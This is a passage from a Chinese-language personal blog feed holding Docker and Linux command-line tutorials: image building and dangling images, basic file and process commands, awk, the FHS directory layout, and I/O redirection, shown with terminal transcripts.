class="bash">[root@localhost cts]# docker build -t youzipii:1.0 .[+] Building 49.0s (7/7) FINISHED                                docker:default =&gt; [internal] load build definition from Dockerfile                       0.0s =&gt; =&gt; transferring dockerfile: 326B                                       0.0s =&gt; [internal] load metadata for docker.io/library/centos:7                0.0s =&gt; [internal] load .dockerignore                                          0.0s =&gt; =&gt; transferring context: 2B                                            0.0s =&gt; [1/3] FROM docker.io/library/centos:7                                  0.0s =&gt; CACHED [2/3] WORKDIR /usr/local                                        0.0s =&gt; [3/3] RUN yum install -y wget vim net-tools                           47.3s =&gt; exporting to image                                                     1.6s =&gt; =&gt; exporting layers                                                    1.6s =&gt; =&gt; writing image sha256:3f62d30f08ddde26d1729b2706c8a7ae9f4e4bbc9171a  0.0s =&gt; =&gt; naming to docker.io/library/youzipii:1.0         [root@localhost cts]# docker run --name ct2 -it youzipii:1.0[root@81ed05ea8530 local]# pwd/usr/local[root@81ed05ea8530 local]# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500#其它信息可以通过docker inspect xx#分层信息,FROM不算[root@localhost cts]# docker history youzipii:1.0IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT3f62d30f08dd   6 minutes ago    CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/bin/bash&quot;]                0B        buildkit.dockerfile.v0&lt;missing&gt;      6 minutes ago    RUN /bin/sh -c yum install -y wget vim net-t…   297MB     buildkit.dockerfile.v0.....[root@localhost ~]# docker run -w /root -it centos7:net-tools[root@6aaf937d3252 ~]# pwd/root[root@6aaf937d3252 ~]# exitexit[root@localhost ~]# docker run --name ct2  -it centos7:net-tools[root@49b72fcb1f16 /]# pwd/#可以看到-w可以指定工作目录，不指定则是默认的workdir</code></pre><p>如果build相同的镜像，后面的会被看作悬虚镜像</p><h3 id="可以构建出新的镜像的方式有"><a href="#可以构建出新的镜像的方式有" class="headerlink" title="可以构建出新的镜像的方式有:"></a>可以构建出新的镜像的方式有:</h3><ol><li>docker build.</li><li>docker commit.</li><li>docker import(注意，docker load并没有构建出新的镜像，其与原镜像是同一个镜像).</li><li>docker compose.</li><li>docker hub中完成Automated Builds.</li></ol><h2 id="悬虚镜像"><a href="#悬虚镜像" class="headerlink" title="悬虚镜像"></a>悬虚镜像</h2><p>悬虚镜像是指既没有 Repository 又没有 Tag的镜像。当新建了一个镜像后，为该镜像指定了一个已经存在的 TAG，那么原来的镜像就会变为悬空镜像。</p><p>为了演示悬虚镜像的生成过程，这里先修改前面定义的 Dockerfile，然后再生成镜像，且生成的新的镜像与前面构建的镜像的名称与 Tag 均相同。</p><p>删除悬虚镜像：</p><p>悬虚镜像是一种“无用”镜像，其存在只能是浪费存储空间，所以一般都是要删除的对于悬虚镜像的删除，除了可以通过 docker</p><p>rmi<imagelD> 进行删除外，还有专门的删除命令 docker image prune。该命令能够一次性删除本地全部的悬空镜像。不过有个前提，就是这些悬虚镜像不能是已经启动了容器的，无论容器是否是退出状态。当然，如果再加上-a选项，则会同时再将没有被任何容器使用的镜像也删除。。</p><p>另外，还有一个命令 docker system prune 也可以删除悬虚镜像。只不过，其不仅删除的是悬虚镜像，还有其它系统“无用”内容。。<br>在删除这个悬虚镜像之前,首先查看其是否启动了容器。如果启动了,则先将容器删除。”</p><pre><code class="bash">docke system/image prune</code></pre><p><img src="/../image/image-20240324230130877.png" alt="image-20240324230130877"></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2023/11/01/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/01/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux下基本命令的掌握"><a href="#Linux下基本命令的掌握" class="headerlink" title="Linux下基本命令的掌握"></a>Linux下基本命令的掌握</h2><h3 id="ls指令"><a href="#ls指令" class="headerlink" title="ls指令"></a>ls指令</h3><p>语法：ls [ 选项 ] [文件或目录]</p><p>功能：对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><p>常用选项：</p><ul><li>-a 列出目录下的所有文件，包括以.开头的隐含文件。</li><li>-d 将目录象文件一样显示，而不是显示其下的文件。如:ls -d指定目录</li><li>-i 输出文件的i节点的索引信息。如ls -ai指定文件</li><li>-k 以k字节的形式表示文件的大小。ls -alk 指定文件</li><li>-| 列出文件的详细信息。</li><li>-t 以时间排序。</li><li>-R 列出所有子目录下的文件。(递归)</li><li>-h 可以显示大小单位，但要和-l参数一起使用</li></ul><h4 id="文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841"><a href="#文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841" class="headerlink" title="文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][https://zhuanlan.zhihu.com/p/505338841]"></a>文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][<a href="https://zhuanlan.zhihu.com/p/505338841]">https://zhuanlan.zhihu.com/p/505338841]</a></h4><h3 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h3><p>语法：pwd</p><p>功能：显示用户当前所在目录</p><p>常用选项：无</p><p><img src="/../image/image-20231031195748175.png" alt="image-20231031195748175"></p><h3 id="cd指令"><a href="#cd指令" class="headerlink" title="cd指令"></a>cd指令</h3><p>Linux系统中，磁盘上的文件和目录被组成一颗目录树，每个节点都是目录或文件</p><p>语法：cd 目录名</p><p>功能：改变工作目录，将当前工作目录改变到指定的目录下</p><p>举例：</p><pre><code>cd ..: 返回上级目录cd /root/Desktop: 绝对路径cd ../day02/:相对路径cd ~: 进入用户家目录cd -: 返回最近访问的目录</code></pre><h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><p>语法：touch [选项]…文件…</p><p>功能：touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在的文件。</p><p>常用选项：</p><ul><li>-a 或-time&#x3D;atime或–time-access或–time&#x3D;use只改存取时间</li><li>-d 适用指定的日期时间，而非现在的时间</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本和touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同</li><li>-t 使用指定的日期时间，而非现在的时间</li></ul><h3 id="mkdir指令（重要）"><a href="#mkdir指令（重要）" class="headerlink" title="mkdir指令（重要）"></a>mkdir指令（重要）</h3><p>语法：mkdir [选项] dirname…</p><p>功能：在当前目录下创建一个名问dirname的目录</p><p>常用选项：</p><ul><li>-p,–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在，加上此选项后，系统将自动建立那些尚不存在的目录，即一次可以建立多个目录。</li></ul><p>举例：</p><pre><code>mkdi -p /test/test1</code></pre><p><img src="/../image/image-20231031202106611.png" alt="image-20231031202106611"></p><h3 id="rmdir指令-amp-amp-rm指令（重要）"><a href="#rmdir指令-amp-amp-rm指令（重要）" class="headerlink" title="rmdir指令&amp;&amp;rm指令（重要）"></a>rmdir指令&amp;&amp;rm指令（重要）</h3><p>rmdir是一个与mkdir相应的命令，mkdir是建立目录，而rmdir是删除命令。</p><p>语法：rmdir [-p] [dirname]</p><p>适用对象：具有当前目录操作权限的使用者</p><p>功能：删除空目录</p><p>常用选项：</p><ul><li>-p 当子目录被删除后如果父目录变成空目录的话，就连带父目录一起删除</li></ul><p>rm命令可以同时删除文件或目录</p><p>语法： rm[-f-i-r-v] [dirname&#x2F;dir]</p><p>适用对象：所有适用者</p><p>功能：删除文件或目录</p><p>常用选项：</p><ul><li>-f 即使文件属性为只读，也直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件</li></ul><h3 id="man指令（重要）"><a href="#man指令（重要）" class="headerlink" title="man指令（重要）"></a>man指令（重要）</h3><p>Linux的命令有很多参数，我们不可能全记住，我们可以通过查看联机手册获取帮助。访问Linux手册页的命令是man。</p><p>语法：man [选项] 命令</p><p>常用选项：</p><ul><li><p>-k 根据关键词搜索联机帮助</p></li><li><p>num只在第num章节找</p></li><li><p>-a 将所有章节的都显示出来，比如man printf它缺省从第一章开始搜索，知道就停止，用a选项，当按下q退出，他会继续往后面搜索，知道所有章节都搜索完毕</p></li><li><p>1是普通命令</p></li><li><p>2 是系统调用如open，write之类的（通过这个，至少可以方便的差导调用这个函数们需要加什么头文件）</p></li><li><p>3 是库函数,如printf,fread</p></li><li><p>4 是特殊文件,也就是&#x2F;dev下的各种设备文件</p></li><li><p>5 是指文件的格式,比如passwd,就会说明这个文件中各个字段的含义</p></li><li><p>6 是给游戏留的,由各个游戏自己定义</p></li><li><p>7 是附件还有一些变量,比如向environ这种全局变量在这里就有说明</p></li><li><p>8 是系统管理用的命令,这些命令只能由root使用,如ifconfig</p></li></ul><p>man手册可以汉化。</p><h3 id="cp指令重要"><a href="#cp指令重要" class="headerlink" title="cp指令重要"></a>cp指令重要</h3><p>语法：cp [选项] 源文件或者目录 目标文件或者目录</p><p>功能：复制文件或目录</p><p>说明：cp指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后的目的地并非一个已存在的目录，则会出现错误信息</p><p><img src="/../image/image-20231031210152423.png" alt="image-20231031210152423"></p><p>常用选项：</p><ul><li>-f或–force强行复制文件或目录，不论目的文件或目录是否已经存在</li><li>-i或–interactive覆盖文件之前先询问用户</li><li>-r递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的志，不属于目录或符号链接，则一律视为普通文件处理</li><li>-R或–recursive递归处理，将指定目录下的文件及子自录—升处理</li></ul><h3 id="mv指令（重要）"><a href="#mv指令（重要）" class="headerlink" title="mv指令（重要）"></a>mv指令（重要）</h3><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename)files）,是linux系统下常用的命令。经常用来备份文件或目录</p><p>语法：mv [选项] 源文件或者目录 目标文件或者目录</p><p>功能：</p><ol><li>视mv命令中第二个参数类型的不同(是目标文件还是目标目录)，mv命令将文件重命名或将其移至一个新的目录中。</li><li>当第二个参数类型是文件时、mv命令完成文件重命名，此时，源文件只能有一个(也可以是源目录名)，它将所给的源文件或目录重命名为给定的日标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。</li></ol><p>常用选项：</p><ul><li>-f : force强制的意思，如果目标文件已经存在，不会询问而直接覆盖. </li><li>-i :若目标文件(destination)已经存在时，就会询问是否覆盖!</li></ul><p>举例：</p><pre><code>将rm改成mvvim ~/.bashrc #修改这个文件mkdir -p ~/.trashalias rm=trashalias ur=undelfileundelfile() &#123;    mv -i !.trash/\$@ ./&#125;trash() &#123;    mv $@ ~/.trash/&#125;</code></pre><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>语法： cat [选项] [文件]</p><p>功能：查看目标文件内容</p><p>常用选项：</p><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行</li></ul><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>date指定格式显示时间 date+%Y:%m:%d</p><p>date用法：date[option]…[+Format]</p><ol><li><p>在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中常用的标记列表如下</p><ul><li>%H:小时(O0..23)</li><li>%M:分钟(00..59)</li><li>%S∶秒(00..61)</li><li>%X∶相当于%H:%M:%S</li><li>%d:日(01..31)</li><li>%m :月份(01..12)</li><li>%Y:完整年份(0000..9999)</li><li>%F:相当于%Y-%m-%d</li></ul></li><li><p>在设定时间方面</p><ul><li>date -s &#x2F;&#x2F;设置当前时间，只有root权限才能设置，其他只能查看。</li><li>date -s 20080523&#x2F;设置成20080523，这样会把具体时间设置成空00:00:00</li><li>date -s 01:01:01&#x2F;&#x2F;设置具体时间，不会对日期做更改</li><li>date -s “01:01:01 2008-05-23”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “01:01:01 20080523”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “2008-05-23 01:01:01”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “200805230 1:01:01”&#x2F;&#x2F;这样可以设置全部时间</li></ul></li><li><p>时间戳</p><p>时间-&gt;时间戳</p><ul><li>date +%s</li></ul><p>时间戳-&gt;时间</p><ul><li>date+%Y:%m:%d -d @1599642565</li></ul><p>Unix时间戳(英文为Unix epoch, Unix time, POSIX time或Unix timestamp)是从1970年1月1日(UTCGMT的午夜)开始所经过的秒数，不考虑闰秒。</p></li></ol><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。我们目前要了解的选项</p><p>选项：</p><ul><li>-u&lt;用户名&gt;指定用户名</li><li>-p&lt;进程号&gt;指定进程</li><li>-n&lt;次数&gt;循环显示的次数</li></ul><h3 id="shutdown关机"><a href="#shutdown关机" class="headerlink" title="shutdown关机"></a>shutdown关机</h3><p>语法：shutdown [选项] 常见选项：</p><ul><li>-h :将系统的服务停掉后，立即关机</li><li>-r ︰在将系统的服务停掉之后就重新启动</li><li>-t sec : -t后面加秒数，亦即『过几秒后关机』的意思</li></ul><p>如果后面购买了云服务器，尽量不要使用shutdown来关机，因为云服务器一般都要保证服务器一直在线，使用exit或者ctrl+d退出即可</p><h3 id="重要的几个热键-Tab-CTRL-c-CTRL-d"><a href="#重要的几个热键-Tab-CTRL-c-CTRL-d" class="headerlink" title="重要的几个热键[Tab],[CTRL]+c,[CTRL]+d"></a>重要的几个热键[Tab],[CTRL]+c,[CTRL]+d</h3><ul><li><p>ctrl + d：退出登陆用户或键盘输入结束</p></li><li><p>tab键：命令或档案的补全</p></li><li><p>ctrl+c：终止前台异常进程</p></li></ul><h3 id="以下命令后续逐一补全"><a href="#以下命令后续逐一补全" class="headerlink" title="以下命令后续逐一补全:"></a>以下命令后续逐一补全:</h3><ul><li>安装和登录命令: login、shutdown、halt、reboot、install、mount、umount、chsh、exit、last;</li><li>文件处理命令: file、mkdir、grep、dd、find、mv、ls、diff、cat、In;</li><li>系统管理相关命令: df、top、free、quota、at、lp、adduser、groupadd、kill、crontab;</li><li>网络操作命令: ifconfig、 ip、ping、netstat、telnet、ftp、route、rlogin、rcp、finger、mail、nslookup</li><li>系统安全相关命令: passwd、su、umask、chgrp、chmod、chown、chattr、sudo ps、who;</li><li>其它命令: tar、unzip、gunzip、unarj、mtools、man、unendcode、uudecode。</li></ul><h3 id="netstat-重要"><a href="#netstat-重要" class="headerlink" title="netstat (重要)"></a>netstat (重要)</h3><p><code>netstat</code>命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。<code>netstat</code>是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。</p><ul><li><p>-a：查看所有连接</p></li><li><p>-c：持续列出网络状态</p></li><li><p>-e：显示网络其他相关信息</p></li><li><p>-n:直接打印连接的IP地址与端口信息</p></li><li><p>-l  或–listening           显示监控中的服务器的Socket。</p></li><li><p>-p  或–programs         显示正在使用Socket的程序识别码和程序名称。</p></li><li><p>-r：显示路由信息</p></li><li><p>-t：显示TCP传输协议的连线状况</p></li></ul><p>netstat -lntp可以用来查看服务器是什么</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>查看进程的PID、名称以及CPU占用率：</p><pre><code class="javascript">ps axo pid,comm,pcpu</code></pre><p>按内存资源的使用量对进程进行排序：</p><pre><code class="javascript">ps aux | sort -rnk 4</code></pre><p>按CPU资源的使用量对进程进行排序：</p><pre><code class="javascript">ps aux | sort -nk 3</code></pre><p>显示所有进程信息：</p><pre><code class="javascript">ps -A</code></pre><p>显示指定用户信息：</p><pre><code class="javascript">ps -u root</code></pre><p>查看线程数：</p><pre><code class="javascript">ps -efL</code></pre><p>查看进程并按内存使用大小排列：</p><pre><code class="javascript">ps -e -o &quot;%C : %p :%z : %a&quot; | sort -k5 -nr</code></pre><p>显示所有进程信息，连同命令行：</p><pre><code class="javascript">ps -ef</code></pre><p>ps与grep常用组合用法，查找特定进程：</p><pre><code class="javascript">ps -ef | grep ssh</code></pre><p>通过名字或命令搜索进程：</p><pre><code class="javascript">ps -C nginx</code></pre><p>CPU或者内存进行排序，降序：</p><pre><code class="javascript">ps aux --sort=-pcpu,+pmem</code></pre><p>用树的风格显示进程的层次关系：</p><pre><code class="javascript">ps -f --forest -C nginx</code></pre><p>显示一个父进程的子进程：</p><pre><code class="javascript">ps -o pid,uname,comm -C nginx</code></pre><p>重定义标签：</p><pre><code class="javascript">ps -e -o pid,uname=USERNAME,pcpu=CPU_USAGE,pmem,comm</code></pre><p>显示进程运行的时间：</p><pre><code class="javascript">ps -e -o pid,comm,etime</code></pre><p>查看named进程详细信息：</p><pre><code class="javascript">ps -aux | grep named</code></pre><p>通过进程id获取服务名称：</p><pre><code class="javascript">ps -o command -p 91730 | sed -n 2p</code></pre><p>将目前属于您自己这次登入的PID与相关信息列示出来：</p><pre><code class="javascript">ps -l</code></pre><p>列出目前所有的正在内存当中的程序：</p><pre><code class="javascript">ps aux</code></pre><p>找出与<code>cron</code>与<code>syslog</code>这两个服务有关的PID号码：</p><pre><code class="javascript">ps aux | egrep &#39;(cron|syslog)&#39;</code></pre><p>把所有进程显示出来，并输出到<code>ps001.txt</code>文件：</p><pre><code class="javascript">ps -aux &gt; ps001.txt</code></pre><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得<br>尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各<br>种分析处理。</p><p>awk有3个不同版本: awk、 nawk和gawk, 未作特别说明，一般指gawk, gawk 是AWK的GNU版本。<br>awk其名称得自于它的创始人Alfred Aho、Peter Weinberger和Brian Kernighan 姓氏的首个字母。实<br>际上AWK的确拥有自己的语言: AWK 程序设计语言，三位创建者已将它正式定义为“样式扫描和处<br>理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计<br>算以及生成报表，还有无数其他的功能。</p><p>有三种方式调用awk:</p><ul><li>1.命令行方式- (重点介绍)<br>awk [-F field-separator]<br>commands’<br>input-file(s)<br>其中，commands是真正awk命令，[-F域分隔符]是可选的。input-file(s) 是待处理的文件。<br>在awk中，文件的每一行中， 由域分隔符分开的每一项称为- 一个域。通常，在不指名F域分隔<br>符的情况下，默认的域分隔符是空格。</li><li>shell脚本方式<br>将所有的awk命令插入-一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，<br>-般通过键入脚本名称来调用。<br>相当于shell脚本首行的: #!&#x2F;bin&#x2F;bash<br>可以换成: #!&#x2F;bin&#x2F; awk</li><li>将所有的awk命令插入- -个单独文件,然后调用:<br>awk -f awk -script-file input-file(s)<br>其中，-f选项加载awk- script-file中的awk脚本，input-file(s) 跟上面的是一样</li></ul><pre><code class="console">[youzipii@localhost ~]$ last -5youzipii pts/1        192.168.174.1    Wed Mar 13 17:17   still logged inyouzipii pts/0        :0               Wed Mar 13 17:16   still logged inyouzipii :0           :0               Wed Mar 13 17:11   still logged in(unknown :0           :0               Wed Mar 13 16:54 - 17:11  (00:17)reboot   system boot  3.10.0-514.el7.x Wed Mar 13 16:53 - 17:28  (00:34)wtmp begins Thu Dec 26 18:50:02 2019wtmp begins Thu Dec 26 18:50:02 2019[youzipii@localhost ~]$ last -n 5 | awk &#39;&#123;print $1&#125;&#39;youzipiiyouzipiiyouzipii(unknownrebootwtmp</code></pre><p>awk工作流程是这样的:读入有’ \n’换行符分割的一- 条记录，然后将记录按指定的域分隔符划分域，<br>填充域，$0则表示所有域, $1表示第- -个域, $n表示第n个域。默认域分隔符是”空白键”或”[tab]<br>键”,所以$1表示登录用户，$3表示登录用户ip,以此类推,可以用逗号隔开</p><pre><code>[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;rootbindaemonadmlpsync[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#39;:&#39; &#39;&#123;print $1&quot;\t&quot;$7&#125;&#39;root    /bin/bashbin     /sbin/nologindaemon  /sbin/nologinadm     /sbin/nologinlp      /sbin/nologinsync    /bin/sync[youzipii@localhost ~]$ ifconfig | awk &#39;/mask/&#39;        inet 192.168.174.142  netmask 255.255.255.0  broadcast 192.168.174.255        inet 127.0.0.1  netmask 255.0.0.0        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</code></pre><p>-F 指定分隔符为：</p><p>&#x2F;内容&#x2F;打印内容所在行</p><h2 id="Linux重定向管道命令环境变量PATH"><a href="#Linux重定向管道命令环境变量PATH" class="headerlink" title="Linux重定向管道命令环境变量PATH"></a>Linux重定向管道命令环境变量PATH</h2><h3 id="Linux目录配置标准FHS"><a href="#Linux目录配置标准FHS" class="headerlink" title="Linux目录配置标准FHS"></a>Linux目录配置标准FHS</h3><p>是什么?</p><p>FHS本质一套规定Linux目录结构，软件建议安装位置的标准<br>为什么?</p><p>使用Linux来开发产品或者发布软件的公司、个人太多，如果每家公司或者个人都按照自己的意愿来配置文件或者软件的存放位置，这无疑是一场灾难。我们可不想学完我们的Linux之后，去公司发现看不懂别人的目录结构，更别谈开发了。<br>怎么办?</p><pre><code>#进入根目录[root@1ocalhost home]# cd /#查看目录树(两层，只看目录，不看文件)[root@localhost /]# tree -d -L 1.|- bin -&gt; usr/bin #可执行文件目录，linux白带命令在这里|- boot #开机会使用到的文件，包括活Linux核心文件以及开机菜单与开机所需配置文件等等。|- dev #设备目录|- etc #配置文件几乎都放宣在这个自录内，例如人员的帐号密码档、各种服务的启始档等等|- home #家目录，系统默认的使用者主文件夹，用户的个人文件都可放在这里|-lib -&gt; usr/lib #放置在开机时会用到的函数库，以及在/bin或/sbin下面的指令会调用的l函数库l|-lib64 -&gt; usr /lib64#与lib类似|- media #放置可移除的设备，包括软盘、光盘、DVD等等设备都暂时挂载于此。|- mnt #设备临时挂载目录|─ opt #第三方协力软件放置的目录|- proc #是一个虚拟文件系统，放置内存中的数据，不占用硬盘空间|- root #系统管理员的主文件夹|- run#放置系统开机后所产生的各项信息|- sbin -&gt; usr/sbin #里面包括了开机、修复、还原系统所需要的指令，root用户使用|- srv #service是一些网络服务启动之后，这些服务所需要取用的数据目录。|—- sys #与proc类似|- tmp #temp,让一般使用者或者是正在执行的程序暂时放置文件的地方|- usr #unix software resource:与软件安装/执行有关|- var #variable,与系统运行过程有关,主要为变动性较大的数据10diro-torioc</code></pre><h4 id="linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917"><a href="#linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917" class="headerlink" title="linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][https://blog.csdn.net/lzq00277/article/details/108303917]"></a>linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][<a href="https://blog.csdn.net/lzq00277/article/details/108303917]">https://blog.csdn.net/lzq00277/article/details/108303917]</a></h4><h3 id="Linux数据重定向的理解与操作"><a href="#Linux数据重定向的理解与操作" class="headerlink" title="Linux数据重定向的理解与操作"></a>Linux数据重定向的理解与操作</h3><h4 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h4><p>基本大部分计算机，要与人交互，都要默认打开三个设备(文件)</p><ul><li>标准输入，stdin，代码是0</li><li>标准输出，stdout，代码是1</li><li>标准错误输出，stderr，代码是2</li></ul><p>为什么?</p><p> Linux一切皆文件，交互需求，输入输出信息分类<br>除了上面的三个标准设备(文件)，我们可能经常有从文件读取数据,或者将数据写入文件的场景</p><h4 id="重定向的理解"><a href="#重定向的理解" class="headerlink" title="重定向的理解"></a>重定向的理解</h4><p>是什么?</p><ul><li>输出&#x2F;追加重定向:本来应该显示到显示器(通常)文件的内容，写入到文件当中。</li><li>输入重定向:或者本来应该从显示器(通常)文件读取数据，转化成从指定文件读取数据</li></ul><pre><code>[root@localhost test1]# touch file1 file2 file3[root@localhost test1]# ls   #当前只有三个文件file1  file2  file3[root@localhost test1]# whoami #该命令输出的结果,默认是直接打印到标准输出的stdout文件中root[root@localhost test1]# whoami&gt;file4 #输出重定向,不在显示出来[root@localhost test1]# ll #新创建文件file4total 4-rw-r--r--. 1 root root 0 Oct 31 07:46 file1-rw-r--r--. 1 root root 0 Oct 31 07:46 file2-rw-r--r--. 1 root root 0 Oct 31 07:46 file3-rw-r--r--. 1 root root 5 Oct 31 07:47 file4[root@localhost test1]# cat file4 #本来应该显示到显示器的内容, 写到了file4文件中root#追加重定向[root@localhost test1]# echo &quot;hello bit&quot;&gt;file4 #将新内容重定向到文件file4中[root@localhost test1]# cat file4 #发现之前的root被覆盖了hello bit[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4[root@localhost test1]# cat file4 #连续重定向多此,发现文件内容并无变化hello bit 其实并不是没有变化,而是每次写入都是重头开始[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4[root@localhost test1]# echo &quot;hello bit2&quot; &gt;&gt; file4[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4[root@localhost test1]# cat file4 #通过多此&gt;&gt;,我们发现内容是被追加到文件结尾的,叫做追加重定向hello bithello bit1hello bit2hello bit1#输入重定向[root@localhost test1]# cat &gt; file1hellobitbesd^Ht^H^H^H^[[4~^[[4~ #ctrl+d结束,Delete键不能删除[root@localhost test1]# cat file1 #可以看出,如果cat后面没有紧跟数据源文件,默认从标准输入获取数据hellobitbest[root@localhost test1]# lltotal 8-rw-r--r--. 1 root root 28 Oct 31 07:50 file1-rw-r--r--. 1 root root  0 Oct 31 07:46 file2-rw-r--r--. 1 root root  0 Oct 31 07:46 file3-rw-r--r--. 1 root root 43 Oct 31 07:48 file4[root@localhost test1]# cat file4hello bithello bit1hello bit2hello bit1[root@localhost test1]# cat &lt; file4 #既然cat要打印文件,前提也是先读取file4,所以也可以这样写hello bithello bit1hello bit2hello bit1[root@localhost test1]# cat &lt; file4 &gt; file3 #读取再写入[root@localhost test1]# cat file3hello bithello bit1hello bit2[root@localhost test1]# cat file4 #原数据保留hello bithello bit1hello bit2hello bit1</code></pre><p>cat &gt;输入时键盘的删除键也会被读入,虽然再次cat不显示,但内存不一样,可以用vi看出来</p><p>代码0,1,2?是什么</p><pre><code>[whb@vM-O-3-centos test]$ find /home -name test.cfind: &#39; /home/w1&#39;: Permission denied #报错信息/home/wudu/work/linux-57/1inux-1esson7/signal_test/test.c#正常信息/home/wudu/work/1inux-57/1inux-1esson7/sigaction_test/test.c#正常信息...[whb@VM-O-3-centos test]$ find /home -name test.c &gt; test_list #发现并不是所有信息都被重定向find: &#39; /home/w1 &#39;: Permission denied#报错信息并没有被写入目标文件[whb@vM-O-3-centos test]$ cat test_list/home/wudu/work/1inux-57/1inux-1esson7/signal_test/test.c#正常信息被写入了/home/wudu/work /1inux-57/1inux-lesson7/sigaction_test/test.c...#1:代表标准输出#2:代表标准错误# 但是他们两个默认都会往显示器打印，像上面的情况，打印输出到显示器会发生混乱#只打印正常信息[whb@VM-O-3-centos test]$ find /home -name test.c 2&gt;err.list/home/wudu/work/linux-57/1inux-lesson7/signal_test/test.c/home/wudu/work/linux-57/linux-lesson7/sigaction_test/test.c/home/wudu/work/1inux-57/linux-lesson7/sigmask/test.c/home/wudu/work/linux-57/linux-1esson15/test/test.c/home/wudu/work / linux-57/1inux-1esson4/pipesize/test.c/home/wudu/work/linux-57/1inux-lesson5/testmkfifo/test.c/home/wudu/work / linux-57/linux-lesson5/shmtest/test.c/home/wudu/work / linux-57/1inux-lesson3/dynamic/test.c/home/wudu/work/linux-57/linux-lesson3 /static/test.c...[whb@vM-O-3-centos test]$ cat err.list #错误信息被单独分离出来find: ‘/home/w1’ : Permission deniedfind: &#39; /home/sly&#39;: Permission deniedfind: ‘ /home/zwc&#39;: Permission deniedfind: ‘/home/cpx&#39;: Permission denied然find: ‘ /home/gb&#39;: Permission deniedfind: &#39; /home/bss&#39;: Permission denied#只打印错误信息#上面默认就是#正常和错误信息都重定向到文件中[whb@vM-O-3-centos test]$ find /home -name test,c &gt;info.list 2&gt;&amp;1[whb@vM-O-3-centos test]$ cat info.7istfind: &#39; /home/wl’ : Permission deniedfind: &#39; /home/wudu/ . local&#39; : Permission denied/home/wudu/work/linux-57/linux-lesson7/sighal test/test.c/home/wudu/work/linux-57/linux-lesson7[sigaction_test/test.c/home/wudu/work/linux-57/1inux -Pesson7 sigmask/test.c...#2&gt;&amp;1??又是什么鬼?这个底层是怎么实现的。目前还不能讲，比特后期的课程才有</code></pre><p>显示器中的输出信息有错误的也有正确得,大于(&gt;)只把正确的写入,即只重定向标准输出,如果要都打印进去,在命令后面加上2&gt;&amp;1即可</p><h4 id="x2F-dev-x2F-null"><a href="#x2F-dev-x2F-null" class="headerlink" 